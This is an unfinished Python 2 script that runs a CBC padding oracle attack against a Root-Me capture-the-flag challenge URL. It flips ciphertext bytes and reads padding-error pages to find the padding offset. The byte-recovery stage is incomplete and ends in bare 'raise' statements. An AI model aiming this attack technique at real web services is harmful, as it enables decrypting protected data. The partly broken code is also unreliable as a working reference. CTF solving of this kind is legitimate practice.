# encoding: utf-8
import logging
from enum import Enum

from leak.base import RegexParser
from leak.leak import HTTPLeaker


#logging.basicConfig()


def hexify(msg):
    return ''.join(['%02x' % ord(_) for _ in msg])

def dehexify(msg):
    return ''.join([chr(int(msg[2*_:2*(_ + 1)], 16)) for _ in xrange(0, len(msg)/2)])

def xor(a, b):
    return chr(ord(a)^ord(b))


class RedPillsParser(RegexParser):
    def __init__(self):
        super(RedPillsParser, self).__init__(pattern=r'.*((?P<success><h2>Home</h2>)|(?P<file><h2>File not found</h2>)|(?P<padding_error><h2>Server Error: Padding Error</h2>).*)')


class CBCPaddingOracle(HTTPLeaker):
    class State(Enum):
        ORIGINAL_PADDING_FINDING = 0
        BYTE_RETRIEVAL           = 1

    def __init__(self, **kwargs):
        super(CBCPaddingOracle, self).__init__(parser=RedPillsParser(), **kwargs)

        self.ciphertext = dehexify('E5D68870EB5626D54D4F12F2A5EA2F80550CF3C11CF45ED978C5CD8155724490')

        self.state.update({
            'original_ciphertext': self.ciphertext,
            #'original_ciphertext': '78152889BDF27A930F14742DBB54A6DECE87A24713B30B76987D2A87DD9D6C52FA1A6B697D62000332F435B99D8371DD', # about us
            'block_length': 16,
            'state': self.State.ORIGINAL_PADDING_FINDING,
            'idx': 0,
        })

        self.logger.info('we start with a message of %d bytes' % (len(self.ciphertext)))

    def update(self):
        state = self.state['state']

        padding_error = self._leak['padding_error']
        success       = self._leak['success']
        file          = self._leak['file']

        if state == self.State.ORIGINAL_PADDING_FINDING:
            # we are starting from the leftest byte and increasing the index
            # until we obtain a padding error
            if file:
                self.state['idx'] += 1
            elif padding_error:
                self.logger.info('padding starts at offset %d' % (self.block_offset(self.blocks_number - 2) + self.state['idx']))
                self.state['state'] = self.State.BYTE_RETRIEVAL
                self.state['idx']   = self.state['block_length'] - self.state['idx'] # this index is from the tail of the string
                self.state['mask']  = '\x00' * len(self.ciphertext) # we create a mask that will xor the original ciphertext
                self.state['mask_byte'] = '\x01' # this is the first try
            elif success:
                raise ValueError('this is bad my friend')

        # now we are trying to bruteforce the padding bytes: we are starting with a know padding
        # from the previous stage and then XORing one byte at the times incrementally
        # when we reach the 'file not found message' means we have guessed right one byte.
        elif state == self.State.BYTE_RETRIEVAL:
            if padding_error:
                # try another byte
                b = ord(self.state['mask_byte']) + 1

                if b > 0xff:
                    raise ValueError('You exceeded the allowed values')

                self.state['mask_byte'] = chr(b)
                raise
            elif file:
                pass


    def get_requests_method(self):
        return 'GET'

    def get_requests_data(self):
        return {}

    def has_finished(self):
        return False

    @property
    def blocks_number(self):
        return len(self.state['original_ciphertext'])/self.state['block_length']

    def block_offset(self, n):
        assert n >= 0
        assert n <= (self.blocks_number - 1)

        return  self.state['block_length'] * n

    def get_requests_params(self):
        ciphertext = self.state['original_ciphertext']
        #ciphertext  = '865D1C0FB5BDB18B29F8CCA11B16FED0BDC02999AE07156FE2B6EC4274235529BD6C85A19359D78977F8B713DE9A47EF' # about us

        if self.state['state'] == self.State.ORIGINAL_PADDING_FINDING:
            # first of all we find the offset of the block before the last
            #import ipdb;ipdb.set_trace()
            idx = (self.block_offset(self.blocks_number - 2) + self.state['idx'])
            ciphertext= ciphertext[:idx] + '0' + ciphertext[idx + 1:]
        elif self.state['state'] == self.State.BYTE_RETRIEVAL:
            self.logger.info('probing %d-th byte' % self.state['idx'])
            raise

        return {
            'c': hexify(ciphertext),
        }

    def get_requests_url(self):
        return 'http://challenge01.root-me.org/realiste/ch12/index.aspx'


if __name__ == '__main__':
    leaker = CBCPaddingOracle()

    print leaker()